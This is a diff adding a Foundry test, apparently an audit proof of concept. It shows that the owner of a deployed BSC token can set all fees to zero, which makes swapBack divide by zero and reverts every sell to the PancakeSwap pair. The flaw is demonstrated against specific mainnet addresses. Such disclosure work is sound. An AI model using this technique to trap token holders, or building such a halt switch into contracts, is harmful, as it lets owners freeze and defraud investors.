@@ -1,0 +1,135 @@
+```solidity
+// Exploit.t.sol
+// Foundry test demonstrating that the owner can halt sales by setting total fees to zero,
+// causing a division by zero in swapBack and reverting all transfers that trigger swapBack.
+
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Interfaces for the token and router
+
+interface ITwelveDaysOfXmas {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function allowance(address, address) external view returns (uint256);
+    function getOwner() external view returns (address);
+    function marketingFee() external view returns (uint256);
+    function totalFee() external view returns (uint256);
+    function setFees(uint256 _marketingFee, uint256 _otherFee) external;
+    function setFeeReceivers(address _marketingFeeReceiver, address _otherFeeReceiver) external;
+    function setSwapBackSettings(bool _enabled, uint256 _amount) external;
+    function swapEnabled() external view returns (bool);
+    function swapThreshold() external view returns (uint256);
+    function pair() external view returns (address);
+    function isFeeExempt(address) external view returns (bool);
+    function router() external view returns (address);
+}
+
+interface IDEXRouter {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+}
+
+contract ExploitTest is Test {
+    // Mainnet addresses
+    address constant TOKEN = 0xb5c50edd218569d7a19fab89ca6b85ec30bd1eb0;
+    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // not strictly needed
+
+    ITwelveDaysOfXmas token;
+    IDEXRouter router;
+    address owner;
+    address pair;
+    address user = address(0xdead);
+    address user2 = address(0xbeef);
+
+    function setUp() public {
+        vm.label(TOKEN, "DOX_Token");
+        vm.label(ROUTER, "PancakeRouter");
+        vm.label(user, "User");
+        vm.label(user2, "User2");
+
+        token = ITwelveDaysOfXmas(TOKEN);
+        router = IDEXRouter(ROUTER);
+        pair = token.pair();
+        vm.label(pair, "PancakePair");
+
+        // Get the current owner (deployer)
+        owner = token.getOwner();
+        vm.label(owner, "Owner");
+
+        // Give BNB to owner and user for gas and liquidity provision
+        vm.deal(owner, 1000 ether);
+        vm.deal(user, 10 ether);
+
+        // Owner transfers some tokens to user and to the token contract itself
+        uint256 initialUserBalance = 10_000 * 10**18;
+        uint256 initialContractBalance = 1_000 * 10**18;
+
+        vm.startPrank(owner);
+        require(token.transfer(user, initialUserBalance), "transfer to user failed");
+        require(token.transfer(address(token), initialContractBalance), "transfer to contract failed");
+        vm.stopPrank();
+
+        // Provide liquidity to the pair so that swapBack can actually swap tokens for BNB
+        uint256 liquidityTokens = 100_000 * 10**18; // 0.1% of supply
+        vm.startPrank(owner);
+        token.approve(ROUTER, liquidityTokens);
+        router.addLiquidityETH{value: 10 ether}(
+            TOKEN,
+            liquidityTokens,
+            0, // min tokens
+            0, // min ETH
+            owner,
+            block.timestamp
+        );
+        vm.stopPrank();
+    }
+
+    function testHaltByZeroFees() public {
+        // --- Step 1: Enable swapBack with a small threshold, default fees (4%) ---
+        vm.prank(owner);
+        token.setSwapBackSettings(true, 1 * 10**18); // threshold = 1 token
+
+        // User tries a sell transfer (to the pair)
+        // This should succeed because fees are non-zero and swapBack will not divide by zero
+        vm.prank(user);
+        bool successBefore = token.transfer(pair, 100 * 10**18);
+        assertTrue(successBefore, "Transfer should succeed before zero fees");
+
+        // --- Step 2: Owner sets marketingFee and otherFee to zero -> totalFee = 0 ---
+        vm.prank(owner);
+        token.setFees(0, 0);
+
+        // Ensure that swapBack will be triggered again: replenish contract balance
+        // (the previous transfer likely consumed some contract balance, so add more)
+        vm.prank(owner);
+        require(token.transfer(address(token), 1_000 * 10**18), "replenish failed");
+
+        // User attempts another sell transfer
+        // This should revert because swapBack will attempt a division by totalFee (zero)
+        vm.prank(user);
+        vm.expectRevert(); // catches division by zero (SafeMath: division by zero)
+        token.transfer(pair, 100 * 10**18);
+    }
+}
+```
